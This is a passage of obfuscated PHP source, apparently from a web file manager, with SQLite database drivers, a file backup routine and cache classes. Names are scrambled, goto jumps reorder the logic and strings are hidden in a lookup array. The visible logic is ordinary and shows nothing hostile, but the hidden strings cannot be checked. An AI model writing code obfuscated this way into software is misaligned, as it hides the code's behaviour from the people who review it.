[$e£À‡Ö¸‡·[12]])) { $f…Ğè¬ö’ [$e£À‡Ö¸‡·[12]] = 438; } $this->config = $f…Ğè¬ö’ ; if (empty($this->config[$e£À‡Ö¸‡·[13]])) { $this->config[$e£À‡Ö¸‡·[13]] = array(); } } } public function connect($EÑ”ÌºÏÉ¾ = '', $e¶¡‘·©ë¹ = 0) { $B—¶‡ÛĞ˜³ =& $_SERVER[£ü]; if (!isset($this->linkID[$e¶¡‘·©ë¹])) { goto fÚË·ÚéÅæ; dİØ†³ìÃƒ: $this->linkID[$e¶¡‘·©ë¹] = $aÕÎßãŞÊ‚($EÑ”ÌºÏÉ¾[$B—¶‡ÛĞ˜³[17]], $EÑ”ÌºÏÉ¾[$B—¶‡ÛĞ˜³[12]]); if (!$this->linkID[$e¶¡‘·©ë¹]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto cöÜÃåçì”; cöÜÃåçì”: @sqlite_busy_timeout($this->linkID[$e¶¡‘·©ë¹], 30000); if (1 != think_config($B—¶‡ÛĞ˜³[18])) { unset($this->config); } goto A“ôºå¿‰í; fÚË·ÚéÅæ: if (empty($EÑ”ÌºÏÉ¾)) { $EÑ”ÌºÏÉ¾ = $this->config; } $cƒÄ‚–Ôóæ = !empty($EÑ”ÌºÏÉ¾[$B—¶‡ÛĞ˜³[13]][$B—¶‡ÛĞ˜³[14]]) ? $EÑ”ÌºÏÉ¾[$B—¶‡ÛĞ˜³[13]][$B—¶‡ÛĞ˜³[14]] : $this->pconnect; $aÕÎßãŞÊ‚ = $cƒÄ‚–Ôóæ ? $B—¶‡ÛĞ˜³[15] : $B—¶‡ÛĞ˜³[16]; goto dİØ†³ìÃƒ; A“ôºå¿‰í: } return $this->linkID[$e¶¡‘·©ë¹]; } public function free() { $this->queryID = null; } public function query($BÈÑÄ…¼‘è) { goto Cò£›‡”Ë; Cò£›‡”Ë: $Aé®·º½ù“ =& $_SERVER[£ü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d‘…šÃôÀŞ; Dã¯Ï‘Äö¼: think_status($Aé®·º½ù“[20]); $this->queryID = sqlite_query($this->_linkID, $BÈÑÄ…¼‘è); $this->debug(); goto fŞ÷­×¬°…; fŞ÷­×¬°…: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $e‚‰ŞÚİö© = $this->getAll(); return $e‚‰ŞÚİö©; } goto f–ĞÛ•ˆ¦­; d‘…šÃôÀŞ: $this->queryStr = $BÈÑÄ…¼‘è; if ($this->queryID) { $this->free(); } think_action_status($Aé®·º½ù“[19], 1); goto Dã¯Ï‘Äö¼; f–ĞÛ•ˆ¦­: } public function execute($d„—Ğõ»’É) { goto F‹ïÌ¢×ÌÃ; F‹ïÌ¢×ÌÃ: $dóš§ğØ« =& $_SERVER[£ü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a’íé›à–; eù Ö¯Œ”Ô: if (!1 === $B«“ÃœöÙ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto b§Ö®ì¸×Ç; a’íé›à–: $this->queryStr = $d„—Ğõ»’É; if ($this->queryID) { $this->free(); } think_action_status($dóš§ğØ«[21], 1); goto F÷¾´™ÍËÆ; F÷¾´™ÍËÆ: think_status($dóš§ğØ«[20]); $B«“ÃœöÙ = sqlite_exec($this->_linkID, $d„—Ğõ»’É); $this->debug(); goto eù Ö¯Œ”Ô; b§Ö®ì¸×Ç: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[£ü][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e—¬˜•Ö‹• = sqlite_query($this->_linkID, $_SERVER[£ü][23]); if (!$e—¬˜•Ö‹•) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $C“¢ä‡¶“í = sqlite_query($this->_linkID, $_SERVER[£ü][24]); if (!$C“¢ä‡¶“í) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $f¤İ¶ÀÒ¥ = array(); if ($this->numRows > 0) { for ($D¯§¹ÙÉí¡ = 0; $D¯§¹ÙÉí¡ < $this->numRows; $D¯§¹ÙÉí¡++) { $f¤İ¶ÀÒ¥[$D¯§¹ÙÉí¡] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $f¤İ¶ÀÒ¥; } public function getFields($E±®»×‡Ğ†) { $F¬µƒÀãÔÙ =& $_SERVER[£ü]; $FÜ¹¸åÚ‡ = $this->query($F¬µƒÀãÔÙ[25] . $E±®»×‡Ğ† . $F¬µƒÀãÔÙ[26]); $a·ùÒ ÛÕÊ = array(); if ($FÜ¹¸åÚ‡) { foreach ($FÜ¹¸åÚ‡ as $bÇØ‹‰¯ÅÈ => $e¿í±ğˆ¾’) { $a·ùÒ ÛÕÊ[$e¿í±ğˆ¾’[$F¬µƒÀãÔÙ[27]]] = array($F¬µƒÀãÔÙ[28] => $e¿í±ğˆ¾’[$F¬µƒÀãÔÙ[27]], $F¬µƒÀãÔÙ[29] => $e¿í±ğˆ¾’[$F¬µƒÀãÔÙ[30]], $F¬µƒÀãÔÙ[31] => (bool) ($e¿í±ğˆ¾’[$F¬µƒÀãÔÙ[32]] === $F¬µƒÀãÔÙ[33]), $F¬µƒÀãÔÙ[34] => $e¿í±ğˆ¾’[$F¬µƒÀãÔÙ[35]], $F¬µƒÀãÔÙ[36] => strtolower($e¿í±ğˆ¾’[$F¬µƒÀãÔÙ[37]]) == $F¬µƒÀãÔÙ[38], $F¬µƒÀãÔÙ[39] => strtolower($e¿í±ğˆ¾’[$F¬µƒÀãÔÙ[40]]) == $F¬µƒÀãÔÙ[41]); } } return $a·ùÒ ÛÕÊ; } public function getTables($AÆƒ¿›§ë = '') { $aÒº‚ª©†Ç =& $_SERVER[£ü]; $cíÎË¯­½ = $this->query($aÒº‚ª©†Ç[42] . $aÒº‚ª©†Ç[43] . $aÒº‚ª©†Ç[44]); $F¶˜óœØ = array(); foreach ($cíÎË¯­½ as $b‘ó¨æ ‚à => $c„ËÀ„Åã) { $F¶˜óœØ[$b‘ó¨æ ‚à] = current($c„ËÀ„Åã); } return $F¶˜óœØ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $bŠ‡ì»ï … =& $_SERVER[£ü]; $FÚ·´æ‰´ø = sqlite_last_error($this->_linkID); $this->error = $FÚ·´æ‰´ø . $bŠ‡ì»ï …[4] . sqlite_error_string($FÚ·´æ‰´ø); if ($bŠ‡ì»ï …[33] != $this->queryStr) { $this->error .= LNG($bŠ‡ì»ï …[45]) . $this->queryStr; } think_trace($this->error, $bŠ‡ì»ï …[33], $bŠ‡ì»ï …[46]); return $this->error; } public function escapeString($bÒĞ¾¸Òáõ) { return sqlite_escape_string($bÒĞ¾¸Òáõ); } public function parseLimit($DæÒ¿šß­±) { $cÄ‘¾Çª³ =& $_SERVER[£ü]; $AÑŞ¸é¹¹ë = $cÄ‘¾Çª³[33]; if (!empty($DæÒ¿šß­±)) { $DæÒ¿šß­± = explode($cÄ‘¾Çª³[47], $DæÒ¿šß­±); if (count($DæÒ¿šß­±) > 1) { $AÑŞ¸é¹¹ë .= $cÄ‘¾Çª³[48] . $DæÒ¿šß­±[1] . $cÄ‘¾Çª³[49] . $DæÒ¿šß­±[0] . $cÄ‘¾Çª³[50]; } else { $AÑŞ¸é¹¹ë .= $cÄ‘¾Çª³[48] . $DæÒ¿šß­±[0] . $cÄ‘¾Çª³[50]; } } return $AÑŞ¸é¹¹ë; } } class DbSqlite3Base extends Db { public function __construct($dÓ¶†°¹Á¼ = '') { $BË¬ó—øñ =& $_SERVER[£ü]; if (!class_exists($BË¬ó—øñ[51])) { think_exception(think_lang($BË¬ó—øñ[10]) . $BË¬ó—øñ[52]); } if (!empty($dÓ¶†°¹Á¼)) { if (!isset($dÓ¶†°¹Á¼[$BË¬ó—øñ[12]])) { $dÓ¶†°¹Á¼[$BË¬ó—øñ[12]] = 438; } $this->config = $dÓ¶†°¹Á¼; if (empty($this->config[$BË¬ó—øñ[13]])) { $this->config[$BË¬ó—øñ[13]] = array(); } } } public function connect($b›¬ÑŸëº = '', $EÒÙäïÔ˜ = 0) { $Eæ¿…Ô¨Ã× =& $_SERVER[£ü]; if (!isset($this->linkID[$EÒÙäïÔ˜])) { if (empty($b›¬ÑŸëº)) { $b›¬ÑŸëº = $this->config; } $this->linkID[$EÒÙäïÔ˜] = new SQLite3($b›¬ÑŸëº[$Eæ¿…Ô¨Ã×[17]]); if (!$this->linkID[$EÒÙäïÔ˜]) { think_exception($this->linkID[$EÒÙäïÔ˜]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$EÒÙäïÔ˜]->busyTimeout(30000); if (1 != think_config($Eæ¿…Ô¨Ã×[18])) { unset($this->config); } } return $this->linkID[$EÒÙäïÔ˜]; } public function free() { $this->queryID = null; } public function query($f¾½ˆáŠ”ò) { goto b„Å´Í¼î; D˜ß«™«¨: $this->queryStr = $f¾½ˆáŠ”ò; if ($this->queryID) { $this->free(); } think_action_status($b£¨‡è¶½[19], 1); goto D‚éêÌ·¬Ş; b„Å´Í¼î: $b£¨‡è¶½ =& $_SERVER[£ü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D˜ß«™«¨; FÂ»î¹½í˜: if (!1 === $this->queryID) { $this->error(); return !1; } else { $bõ‘š°Œà‡ = $this->getAll(); $this->numRows = count($bõ‘š°Œà‡); return $bõ‘š°Œà‡; } goto Añƒ®ƒè‡; D‚éêÌ·¬Ş: think_status($b£¨‡è¶½[20]); $this->queryID = $this->_linkID->query($f¾½ˆáŠ”ò); $this->debug(); goto FÂ»î¹½í˜; Añƒ®ƒè‡: } public function execute($e½Ç´Ú¸õ) { goto AÛì­ Á¦; AÛì­ Á¦: $BÂ«¨–§àø =& $_SERVER[£ü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aôòîá°è„; f¿˜†½Êİ: if (!1 === $DùÔíºÃ´Ç) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto aÖˆ¦îªÑ™; aŒÂ¾”øòª: think_status($BÂ«¨–§àø[20]); $DùÔíºÃ´Ç = $this->_linkID->exec($e½Ç´Ú¸õ); $this->debug(); goto f¿˜†½Êİ; aôòîá°è„: $this->queryStr = $e½Ç´Ú¸õ; if ($this->queryID) { $this->free(); } think_action_status($BÂ«¨–§àø[21], 1); goto aŒÂ¾”øòª; aÖˆ¦îªÑ™: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[£ü][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $côÒÚèÓù¼ = $this->_linkID->query($_SERVER[£ü][23]); if (!$côÒÚèÓù¼) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $b»á‘àç = $this->_linkID->query($_SERVER[£ü][24]); if (!$b»á‘àç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $CÂ¿ïÂğ”Ê = array(); while ($CäÇÃÕâ®Ÿ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $CÂ¿ïÂğ”Ê[] = $CäÇÃÕâ®Ÿ; } $this->queryID->reset(); return $CÂ¿ïÂğ”Ê; } public function getFields($fĞ®Ã’ó¬) { $aĞéô­°“ =& $_SERVER[£ü]; $A¬…Á¥ÇïÑ = $this->query($aĞéô­°“[25] . $fĞ®Ã’ó¬ . $aĞéô­°“[26]); $eğ×‡Ğ¢Çí = array(); if ($A¬…Á¥ÇïÑ) { foreach ($A¬…Á¥ÇïÑ as $d†Ó´âë‚Ã => $cõì°«Âèï) { $eğ×‡Ğ¢Çí[$cõì°«Âèï[$aĞéô­°“[28]]] = array($aĞéô­°“[28] => $cõì°«Âèï[$aĞéô­°“[28]], $aĞéô­°“[29] => $cõì°«Âèï[$aĞéô­°“[29]], $aĞéô­°“[31] => (bool) ($cõì°«Âèï[$aĞéô­°“[31]] === $aĞéô­°“[33]), $aĞéô­°“[34] => $cõì°«Âèï[$aĞéô­°“[53]], $aĞéô­°“[36] => (bool) $cõì°«Âèï[$aĞéô­°“[54]], $aĞéô­°“[39] => (bool) $cõì°«Âèï[$aĞéô­°“[54]]); } } return $eğ×‡Ğ¢Çí; } public function getTables($A½¬ßØÆ‹‰ = '') { $Bµ—°šÚÈ‰ =& $_SERVER[£ü]; $cìÕè™¡—× = $this->query($Bµ—°šÚÈ‰[42] . $Bµ—°šÚÈ‰[43] . $Bµ—°šÚÈ‰[44]); $b™´Îó”Ã = array(); foreach ($cìÕè™¡—× as $B—Ğ¬¨ß»ä => $fêÕó‰ÂÂŒ) { $b™´Îó”Ã[$B—Ğ¬¨ß»ä] = current($fêÕó‰ÂÂŒ); } return $b™´Îó”Ã; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $f×Ñ¦‚¬–Æ =& $_SERVER[£ü]; $this->error = $this->_linkID->lastErrorMsg(); if ($f×Ñ¦‚¬–Æ[33] != $this->queryStr) { $this->error .= LNG($f×Ñ¦‚¬–Æ[45]) . $this->queryStr; } think_trace($this->error, $f×Ñ¦‚¬–Æ[33], $f×Ñ¦‚¬–Æ[46]); return $this->error; } public function escapeString($b³šĞˆ³Ù·) { $aš©¥ È¹º =& $_SERVER[£ü]; if ($this->_linkID) { return $this->_linkID->escapeString($b³šĞˆ³Ù·); } return str_ireplace($aš©¥ È¹º[55], $aš©¥ È¹º[56], $b³šĞˆ³Ù·); } public function parseLimit($eÜƒ×­ë•©) { $F¹àåö·‡ö =& $_SERVER[£ü]; $dÆ‡Õ½•„¼ = $F¹àåö·‡ö[33]; if (!empty($eÜƒ×­ë•©)) { $eÜƒ×­ë•© = explode($F¹àåö·‡ö[47], $eÜƒ×­ë•©); if (count($eÜƒ×­ë•©) > 1) { $dÆ‡Õ½•„¼ .= $F¹àåö·‡ö[48] . $eÜƒ×­ë•©[1] . $F¹àåö·‡ö[49] . $eÜƒ×­ë•©[0] . $F¹àåö·‡ö[50]; } else { $dÆ‡Õ½•„¼ .= $F¹àåö·‡ö[48] . $eÜƒ×­ë•©[0] . $F¹àåö·‡ö[50]; } } return $dÆ‡Õ½•„¼; } } goto EºÃìáê‹; b „ÉäçÏ: class BackupFile { public function __construct() { } public function index() { goto b‘ï’¼î²; a‚‚‡ë‰¨†: $BÜ¶õ‰ø˜Ì = $féÉæÆçµÅ ? 1 : 0; $DÏêíµçé× = array($_SERVER[£ü][746] => 1, $_SERVER[£ü][692] => time(), $_SERVER[£ü][698] => $BÜ¶õ‰ø˜Ì, $_SERVER[£ü][743] => $AÌ‘’˜„æÛ, $_SERVER[£ü][735] => $B±Ê±Ñ¸ô‹, $_SERVER[£ü][734] => $D®”à¤Ø); if ($b‹…éè¬) { $DÏêíµçé×[$_SERVER[£ü][744]] = $BÆ‡™³ê—; $DÏêíµçé×[$_SERVER[£ü][745]] = $CŞĞ•ì¦’; } goto cĞÕ¢šß²; Cõêë•ãö: $eßœ—Ñ¯ìÕ->task[$_SERVER[£ü][687]] = $B±Ê±Ñ¸ô‹; $DÏêíµçé× = array($_SERVER[£ü][734] => $D®”à¤Ø, $_SERVER[£ü][735] => $B±Ê±Ñ¸ô‹); Backup::set($DÏêíµçé×); goto d°õ¡†Ù“Œ; d°õ¡†Ù“Œ: $féÉæÆçµÅ = !0; $e¨Ö‹é¨ê† = $this->storeIds(); $E£‡¶âÀ ¸ = 1; goto Cß¢éõİÃ; bø”ÁóÍô¤: $D®”à¤Ø = (int) Model($_SERVER[£ü][708])->where($C«„£˜Ãë¡)->count($_SERVER[£ü][415]); $B±Ê±Ñ¸ô‹ = (int) Model($_SERVER[£ü][708])->where($C«„£˜Ãë¡)->sum($_SERVER[£ü][77]); $eßœ—Ñ¯ìÕ = new TaskFileTransfer($_SERVER[£ü][732], $_SERVER[£ü][701], $D®”à¤Ø, LNG($_SERVER[£ü][702]) . $_SERVER[£ü][703] . LNG($_SERVER[£ü][733])); goto Cõêë•ãö; cĞÕ¢šß²: Backup::set($DÏêíµçé×); $this->_fileFilter($d¹”¾äàŞÛ); return !0; goto a¹ª—µè‰; b‘ï’¼î²: $B¼æÓÛ™´ = Backup::get(); $AÌ‘’˜„æÛ = $B¼æÓÛ™´[$_SERVER[£ü][278]][$_SERVER[£ü][164]][$_SERVER[£ü][415]]; $C«„£˜Ãë¡ = array($_SERVER[£ü][416] => array($_SERVER[£ü][730], $AÌ‘’˜„æÛ), $_SERVER[£ü][731] => array($_SERVER[£ü][316], $B¼æÓÛ™´[$_SERVER[£ü][680]])); goto bø”ÁóÍô¤; c»ÜßœÉåë: $CŞĞ•ì¦’ = $BÆ‡™³ê— = 0; do { $EÒƒ«îËë = $_SERVER[£ü][736]; $B„‚ÔÒÉ‘„ = Model($_SERVER[£ü][708])->where($C«„£˜Ãë¡)->field($EÒƒ«îËë)->order($_SERVER[£ü][737])->selectPage($d³ºœ›Ší³, $E£‡¶âÀ ¸); $e‰˜ˆù¬»† = !empty($B„‚ÔÒÉ‘„[$_SERVER[£ü][351]]) ? $B„‚ÔÒÉ‘„[$_SERVER[£ü][351]] : array(); foreach ($e‰˜ˆù¬»† as $dÖ«è„‡†Ù) { goto E‰…ÁöÚ±; D‚±ê„˜÷: if (IO::exist($Aöåõˆê)) { $eßœ—Ñ¯ìÕ->updateFileEnd($dÖ«è„‡†Ù[$_SERVER[£ü][28]], $dÖ«è„‡†Ù[$_SERVER[£ü][77]]); } else { $Aöåõˆê = get_path_father($Aöåõˆê); IO::mkdir($Aöåõˆê); if (!IO::copy($b‚°£ãÎ£×, $Aöåõˆê, $_SERVER[£ü][740])) { write_log($_SERVER[£ü][741] . $b‚°£ãÎ£× . $_SERVER[£ü][742] . $Aöåõˆê . $_SERVER[£ü][472], $_SERVER[£ü][701]); $féÉæÆçµÅ = !1; break; } } $AÌ‘’˜„æÛ = $dÖ«è„‡†Ù[$_SERVER[£ü][415]]; $b‹…éè¬ += 1; goto b¦×‘çÀÅŠ; b¦×‘çÀÅŠ: $cÔÂŸšíèë += $dÖ«è„‡†Ù[$_SERVER[£ü][77]]; $BÆ‡™³ê— += 1; $CŞĞ•ì¦’ += $dÖ«è„‡†Ù[$_SERVER[£ü][77]]; goto DËóÊíÆ—ï; DËóÊíÆ—ï: if ($cÔÂŸšíèë >= 1024 * 1024 * 100) { $DÏêíµçé× = array($_SERVER[£ü][743] => $AÌ‘’˜„æÛ, $_SERVER[£ü][744] => $BÆ‡™³ê—, $_SERVER[£ü][745] => $CŞĞ•ì¦’); Backup::set($DÏêíµçé×); $cÔÂŸšíèë = $b‹…éè¬ = 0; } goto bùîé¼ˆœÀ; E‰…ÁöÚ±: if (!$this->_fileExist($dÖ«è„‡†Ù, $d¹”¾äàŞÛ, $e¨Ö‹é¨ê†)) { $D®”à¤Ø -= 1; $B±Ê±Ñ¸ô‹ -= (int) $dÖ«è„‡†Ù[$_SERVER[£ü][77]]; write_log("\146\151\154\145\x20\x6e\x6f\x74\x20\145\x78\x69\x73\x74\x2e\146\x69\154\145\x49\x44\72{$dÖ«è„‡†Ù[$_SERVER[£ü][415]]}\54\40\160\141\164\x68\x3a{$dÖ«è„‡†Ù[$_SERVER[£ü][75]]}", $_SERVER[£ü][738]); continue; } $b‚°£ãÎ£× = $dÖ«è„‡†Ù[$_SERVER[£ü][75]]; $Aöåõˆê = "\173\x69\157\x3a{$B¼æÓÛ™´[$_SERVER[£ü][680]]}\175" . substr($b‚°£ãÎ£×, strlen("\173\x69\157\72{$dÖ«è„‡†Ù[$_SERVER[£ü][739]]}\175")); goto D‚±ê„˜÷; bùîé¼ˆœÀ: } $AÕï‚ô©õ = count($e‰˜ˆù¬»†); $E£‡¶âÀ ¸++; } while ($AÕï‚ô©õ == $d³ºœ›Ší³); $eßœ—Ñ¯ìÕ->end(); goto a‚‚‡ë‰¨†; Cß¢éõİÃ: $d³ºœ›Ší³ = 1000; $cÔÂŸšíèë = $b‹…éè¬ = 0; $d¹”¾äàŞÛ = array(); goto c»ÜßœÉåë; a¹ª—µè‰: } private function _fileExist($bÉë­£ßá´, &$D“Éµ©°®, $Cá‚ĞÇ²Œ) { goto Aù®ÜÁÕèö; bùÃéà³¸é: if (IO::exist($b­³ªŸùÛà)) { $D“Éµ©°®[] = $bÉë­£ßá´[$D¤íÔùÓÕ[415]]; return !1; } $d¡¢°Œ×èˆ = array($D¤íÔùÓÕ[739] => $bÉë­£ßá´[$D¤íÔùÓÕ[739]], $D¤íÔùÓÕ[75] => array($D¤íÔùÓÕ[747], "{$b­³ªŸùÛà}\x25")); $A˜è¾ÕŒóÈ = Model($D¤íÔùÓÕ[708])->where($d¡¢°Œ×èˆ)->field($D¤íÔùÓÕ[416])->select(); goto C•ğ¢¶¤Œñ; C•ğ¢¶¤Œñ: $D“Éµ©°® = array_merge($D“Éµ©°®, array_to_keyvalue($A˜è¾ÕŒóÈ, $D¤íÔùÓÕ[33], $D¤íÔùÓÕ[415])); return !1; goto BÖ»ö‡ÔÑÖ; Aù®ÜÁÕèö: $D¤íÔùÓÕ =& $_SERVER[£ü]; $e„Ü„•ÁÊñ = $bÉë­£ßá´[$D¤íÔùÓÕ[75]]; if (in_array($bÉë­£ßá´[$D¤íÔùÓÕ[415]], $D“Éµ©°®)) { return !1; } goto Eäê¶Õê–Õ; Eäê¶Õê–Õ: if (!in_array($bÉë­£ßá´[$D¤íÔùÓÕ[739]], $Cá‚ĞÇ²Œ)) { return !1; } if (IO::exist($e„Ü„•ÁÊñ)) { return !0; } $b­³ªŸùÛà = get_path_father($e„Ü„•ÁÊñ); goto bùÃéà³¸é; BÖ»ö‡ÔÑÖ: } private function _fileFilter($c‰÷®êßìù) { $FÛî¶ÃÎ”Ç =& $_SERVER[£ü]; if (empty($c‰÷®êßìù)) { return; } $B”ôî‹÷ˆö = array($FÛî¶ÃÎ”Ç[415] => array($FÛî¶ÃÎ”Ç[7], array_unique($c‰÷®êßìù))); $B—Ğ¹íø›­ = Model($FÛî¶ÃÎ”Ç[748])->where($B”ôî‹÷ˆö)->field($FÛî¶ÃÎ”Ç[366])->select(); foreach ($B—Ğ¹íø›­ as $eÅÂÈœªó·) { Model($FÛî¶ÃÎ”Ç[748])->remove($eÅÂÈœªó·[$FÛî¶ÃÎ”Ç[366]], !1); } } private function storeIds() { $d¼ÃÓõ›‘‚ =& $_SERVER[£ü]; $fèƒ¬ë‘İõ = Model($d¼ÃÓõ›‘‚[693])->listData(); return array_to_keyvalue($fèƒ¬ë‘İõ, $d¼ÃÓõ›‘‚[33], $d¼ÃÓõ›‘‚[364]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto F§‰Ë‚ÉÄ±; F§‰Ë‚ÉÄ±: $a÷ÂÃ•²•˜ =& $_SERVER[£ü]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto E½ø›ˆä¦³; e¬îÇÚĞ•™: switch ($FíÜ“Ù‹Ÿ[$a÷ÂÃ•²•˜[749]]) { case $a÷ÂÃ•²•˜[17]: self::$handle = Model($a÷ÂÃ•²•˜[751]); break; case $a÷ÂÃ•²•˜[752]: self::$handle = new CacheRedis($cÙÀ©·¿§’, $D¸‚ïâã¶›); break; case $a÷ÂÃ•²•˜[753]: self::$handle = new CacheMemcached($cÙÀ©·¿§’, $D¸‚ïâã¶›); break; case $a÷ÂÃ•²•˜[164]: self::$handle = new CacheFile($cÙÀ©·¿§’, $D¸‚ïâã¶›); break; default: break; } return self::$handle; goto Fœ«Ìø²‡ï; E½ø›ˆä¦³: $FíÜ“Ù‹Ÿ = $GLOBALS[$a÷ÂÃ•²•˜[6]][$a÷ÂÃ•²•˜[334]]; $cÙÀ©·¿§’ = $FíÜ“Ù‹Ÿ[$FíÜ“Ù‹Ÿ[$a÷ÂÃ•²•˜[749]]]; $D¸‚ïâã¶› = $FíÜ“Ù‹Ÿ[$a÷ÂÃ•²•˜[750]]; goto e¬îÇÚĞ•™; Fœ«Ìø²‡ï: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Eèâ¨éáòá) { if (is_array($Eèâ¨éáòá) || is_object($Eèâ¨éáòá)) { $Eèâ¨éáòá = json_encode($Eèâ¨éáòá); } $Eèâ¨éáòá = rawurlencode($Eèâ¨éáòá); return KOD_SITE_ID . $_SERVER[£ü][70] . $Eèâ¨éáòá; } public static function get($dƒ«Š‡ŞÒ‰) { $dÈÚÒÈÉö = self::key($dƒ«Š‡ŞÒ‰); if (!isset(self::$memoryCache[$dÈÚÒÈÉö])) { CacheLock::lock($dƒ«Š‡ŞÒ‰); $F †´¡ĞŞŒ = self::init()->get($dÈÚÒÈÉö); CacheLock::unlock($dƒ«Š‡ŞÒ‰); self::$memoryCache[$dÈÚÒÈÉö] = unserialize($F †´¡ĞŞŒ); } return self::$memoryCache[$dÈÚÒÈÉö]; } public static function set($e­Ÿ‹Óñ½, $e¶¤ä¥ƒŠ†, $Dİ‚Œ‡Øˆ = false) { goto FÌ×Ï¼ì¦‘; A¢ÜÄ‚îé: CacheLock::lock($e­Ÿ‹Óñ½); $e±¥»ì¦Á¦ = self::init()->set($F²½Ñ…óò´, serialize($e¶¤ä¥ƒŠ†), $Dİ‚Œ‡Øˆ); self::$memoryCache[$F²½Ñ…óò´] = $e¶¤ä¥ƒŠ†; goto EÀÌ÷ò»ñ¸; EÀÌ÷ò»ñ¸: CacheLock::unlock($e­Ÿ‹Óñ½); return $e±¥»ì¦Á¦; goto AàÆ›’¤Ê; FÌ×Ï¼ì¦‘: $F²½Ñ…óò´ = self::key($e­Ÿ‹Óñ½); if (isset(self::$memoryCache[$F²½Ñ…óò´]) && self::$memoryCache[$F²½Ñ…óò´] === $e¶¤ä¥ƒŠ†) { return !0; } if ($Dİ‚Œ‡Øˆ === 0) { self::$memoryCache[$F²½Ñ…óò´] = $e¶¤ä¥ƒŠ†; return !0; } goto A¢ÜÄ‚îé; AàÆ›’¤Ê: } public static function remove($b¦Ö…ÑÈ§) { goto a—É…½Õ¶; D¡¥ğ…Å‡Á: CacheLock::lock($b¦Ö…ÑÈ§); $BìÃëö‡â› = self::init()->remove($d•é²¤); CacheLock::unlock($b¦Ö…ÑÈ§); goto e ¨ÑÍ³œ¿; a—É…½Õ¶: $d•é²¤ = self::key($b¦Ö…ÑÈ§); unset(self::$memoryCache[$d•é²¤]); self::clearTimeout(); goto D¡¥ğ…Å‡Á; e ¨ÑÍ³œ¿: return $BìÃëö‡â›; goto BïÇŞà…ø¾; BïÇŞà…ø¾: } public static function clearMemory($Aíï•ñÒ = false) { if ($Aíï•ñÒ) { $Aíï•ñÒ = self::key($Aíï•ñÒ); unset(self::$memoryCache[$Aíï•ñÒ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[£ü][754])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[£ü][755])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($D£ŞŞğÉÂÕ, $cÄÑùĞ®í) { $D‰óì¬ƒëâ =& $_SERVER[£ü]; $this->cachePath = $D£ŞŞğÉÂÕ[$D‰óì¬ƒëâ[75]]; $this->prefix = $D‰óì¬ƒëâ[756]; $this->cacheTime = $cÄÑùĞ®í; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($Dõ÷˜áˆš‚) { $Cˆùã ŸÓ¤ =& $_SERVER[£ü]; $Dõ÷˜áˆš‚ = str_replace(array($Cˆùã ŸÓ¤[757], $Cˆùã ŸÓ¤[95], $Cˆùã ŸÓ¤[69]), $Cˆùã ŸÓ¤[758], $Dõ÷˜áˆš‚); return $this->cachePath . $Cˆùã ŸÓ¤[759] . $Dõ÷˜áˆš‚ . $Cˆùã ŸÓ¤[760]; } public function set($D¼ˆ§¦Òé, $B™ŞÃ…¬”ñ, $D÷öËª´àµ = false) { $côÔôóóßá = $this->getFile($D¼ˆ§¦Òé); if (file_put_contents($côÔôóóßá, $this->prefix . $B™ŞÃ…¬”ñ, LOCK_EX)) { return !0; } @unlink($côÔôóóßá); return !1; } public function get($dÑ”ˆ·Ñ¹Î) { $BŠ¥ëàÕÊ¶ = $this->getFile($dÑ”ˆ·Ñ¹Î); if (file_exists($BŠ¥ëàÕÊ¶) && filemtime($BŠ¥ëàÕÊ¶) < time() - $this->cacheTime) { @unlink($BŠ¥ëàÕÊ¶); return !1; } $CõõàÄµô = @file_get_contents($BŠ¥ëàÕÊ¶); return substr($CõõàÄµô, strlen($this->prefix)); } public function remove($E„£ô‚ØÛ¡) { $A…ŠäØƒî„ = $this->getFile($E„£ô‚ØÛ¡); return @unlink($A…ŠäØƒî„); } public function deleteAll() { $c“•­¢…Ü‘ =& $_SERVER[£ü]; $aœºĞ×‘ò = scandir($this->cachePath); foreach ($aœºĞ×‘ò as $DÕí ‡ä…½) { $e¯‘ÏÁ†‡Í = $this->cachePath . $DÕí ‡ä…½; if (strpos($e¯‘ÏÁ†‡Í, $c“•­¢…Ü‘[760]) && strpos($e¯‘ÏÁ†‡Í, $c“•­¢…Ü‘[761])) { @unlink($e¯‘ÏÁ†‡Í); } } } public function clearTimeout() { $a¡×Ÿä‹™ =& $_SERVER[£ü]; $EØôĞÆÈÇ¸ = 